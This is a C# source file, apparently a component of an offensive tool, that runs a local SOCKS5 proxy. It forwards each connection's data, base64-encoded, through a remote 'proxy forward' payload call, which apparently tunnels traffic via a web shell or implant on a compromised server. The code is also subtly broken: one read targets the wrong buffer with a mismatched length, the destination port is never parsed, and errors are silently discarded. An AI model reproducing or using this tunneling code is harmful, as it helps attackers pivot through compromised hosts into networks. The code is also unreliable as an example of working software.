using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Alien
{
    internal class clsfnSocks5
    {
        private clsWeb m_web { get; init; }
        private int m_nSessionId { get; set; }
        private int m_nPort { get; init; }
        private TcpListener m_listener { get; set; }
        private CancellationTokenSource m_cts;

        public event Action<string> OnLogReceived;

        public clsfnSocks5(clsWeb web, int nPort = 1080)
        {
            m_web = web;
            m_nPort = nPort;
            m_nSessionId = new Random().Next(1000, 9999);
        }

        public async Task<byte[]?> fnSendData(string szIP, int nPort, byte[] abData)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("proxy", new string[] { "forward", m_nSessionId.ToString(), szIP, nPort.ToString(), Convert.ToBase64String(abData) });
                if (string.IsNullOrEmpty(szResp))
                    return null;

                using (JsonDocument doc = JsonDocument.Parse(szResp))
                {
                    JsonElement root = doc.RootElement;
                    if (root.TryGetProperty("status", out JsonElement status) && status.GetString() == "success")
                    {
                        if (root.TryGetProperty("data", out JsonElement data))
                        {
                            string szData = data.GetString() ?? string.Empty;
                            return Convert.FromBase64String(szData);
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }

            return null;
        }

        public async Task fnStartAsync()
        {
            m_cts = new CancellationTokenSource();
            m_listener = new TcpListener(IPAddress.Loopback, m_nPort);
            m_listener.Start();

            try
            {
                while (!m_cts.Token.IsCancellationRequested)
                {
                    var client = m_listener.AcceptTcpClientAsync();
                    await Task.WhenAny(client, Task.Delay(-1, m_cts.Token));

                    if (m_cts.Token.IsCancellationRequested)
                        break;

                    TcpClient user_client = await client;
                    _ = Task.Run(() => fnHandleClientAsync(user_client), m_cts.Token);
                }
            }
            catch (Exception ex)
            {

            }
        }

        public void fnStop()
        {
            m_cts?.Cancel();
            m_listener?.Stop();
        }

        private async Task fnHandleClientAsync(TcpClient client)
        {
            using (client)
            {
                using (NetworkStream ns = client.GetStream())
                {
                    byte[] abBuffer = new byte[8192];
                    int nRead = await ns.ReadAsync(abBuffer, 0, abBuffer.Length);
                    if (nRead < 2 || abBuffer[0] != 0x05)
                        return;

                    byte[] abAuthResp = new byte[] { 0x05, 0x00 };
                    await ns.WriteAsync(abAuthResp, 0, abAuthResp.Length);

                    nRead = await ns.ReadAsync(abAuthResp, 0, abBuffer.Length);
                    if (nRead < 4 || abBuffer[1] != 0x01)
                        return;

                    byte type = abBuffer[3];
                    string szTargetIP = string.Empty;
                    int nPort = 0;
                    int nOffset = 4;

                    if (type == 0x01) // IPv4
                    {
                        szTargetIP = $"{abBuffer[nOffset]}.{abBuffer[nOffset + 1]}.{abBuffer[nOffset + 2]}.{abBuffer[nOffset + 3]}";
                        nOffset += 4;
                    }
                    else if (type == 0x03) // Domain
                    {
                        byte domainLength = abBuffer[nOffset];
                        szTargetIP = Encoding.ASCII.GetString(abBuffer, nOffset + 1, domainLength);
                        nOffset += domainLength + 1;
                    }
                    else
                    {
                        // Not support (ex. IPv6)
                        return;
                    }

                    byte[] abResp = new byte[] { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 };
                    await ns.WriteAsync(abResp, 0, abResp.Length);

                    while (!m_cts.Token.IsCancellationRequested)
                    {
                        int nReqLen = await ns.ReadAsync(abBuffer, 0, abBuffer.Length);
                        if (nReqLen <= 0)
                            break;

                        byte[] abReqData = new byte[nReqLen];
                        Array.Copy(abBuffer, 0, abReqData, 0, nReqLen);

                        byte[]? abRespData = await fnSendData(szTargetIP, nPort, abReqData);
                        if (abRespData != null && abRespData.Length > 0)
                        {
                            await ns.WriteAsync(abRespData, 0, abRespData.Length);
                        }
                        else
                        {
                            break;
                        }
                    }
                }
            }
        }
    }
}
